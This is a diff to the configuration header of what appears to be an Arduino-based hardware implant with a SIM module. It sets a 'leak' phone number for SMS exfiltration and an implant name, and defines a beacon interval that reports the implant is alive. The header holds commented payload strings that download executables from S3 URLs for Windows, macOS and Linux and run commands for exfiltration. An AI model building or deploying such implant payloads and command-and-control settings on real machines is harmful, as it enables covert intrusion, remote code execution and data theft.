@@ -3,19 +3,26 @@
 #include "C_USBhost.h"
 #include <SoftwareSerial.h>
 
-#define LEAK_PHONE_NUMBER "+14422457648"
-// We need to comment the next line, #define DEBUG false won't work as expected
-//#define DEBUG true
-// Used by Oca to debug the code with an arduino without a SIM module and without an USB host
+/*******************************************/
+/******* START CONFIGURATION OPTIONS *******/
+/*******************************************/
+#define LEAK_PHONE_NUMBER "+XXXXXXXXXXX"		// Set to the leaking phone number
+#define IMPLANT_NAME "Implant 1"				// Identify device when multiple used			
+//#define DEBUG 								// Un-comment if you want to build with DEBUG.
+
+// Used to debug the code with an arduino without a SIM module and without an USB host
 //#define DEBUGWITHOUTSIM true
-//#define DEBUGWITHOUTSIM_PAYLOAD "UnlockDownload##win##PASSWORD##https://s3.amazonaws.com/hellotesthellotesthello/hello.exe"
-//#define DEBUGWITHOUTSIM_PAYLOAD "UnlockDownload##osx##PASSWORD##https://s3.amazonaws.com/hellotesthellotesthello/hello_osx"
-//#define DEBUGWITHOUTSIM_PAYLOAD "UnlockDownload##lnx##PASSWORD##https://s3.amazonaws.com/hellotesthellotesthello/hello_lin"
+//#define DEBUGWITHOUTSIM_PAYLOAD "UnlockDownload##win##PASSWORD##https://s3.amazonaws.com/testing/hello.exe"
+//#define DEBUGWITHOUTSIM_PAYLOAD "UnlockDownload##osx##PASSWORD##https://s3.amazonaws.com/testing/hello_osx"
+//#define DEBUGWITHOUTSIM_PAYLOAD "UnlockDownload##lnx##PASSWORD##https://s3.amazonaws.com/testing/hello_lin"
 //#define DEBUGWITHOUTSIM_PAYLOAD "UnlockRunAndExfil##win##PASSWORD##mkdir %TEMP%\\malware"
 //#define DEBUGWITHOUTSIM_PAYLOAD "UnlockRunAndExfil##osx##PASSWORD##uname -a"
 //#define DEBUGWITHOUTSIM_PAYLOAD "UnlockRunAndExfil##lnx##PASSWORD##touch /tmp/malware"
 
-#define IMPLANT_NAME "Implant 1"
+/*******************************************/
+/******* END CONFIGURATION OPTIONS *********/
+/*******************************************/
+
 
 extern C_USBhost USBhost;
 extern SoftwareSerial SMSSERIAL;
@@ -28,7 +35,8 @@ extern SoftwareSerial SMSSERIAL;
 #define BAUD_RATE_SERIAL 115200
 
 #ifdef DEBUG
-#define BEACON_TIME 1 // Time in minutes we will send a beacon to let know it's alive
+// Time in minutes we will send a beacon to let know the implant is alive
+#define BEACON_TIME 1 
 #else
-#define BEACON_TIME 30 // Time in minutes we will send a beacon to let know it's alive
+#define BEACON_TIME 30
 #endif                      
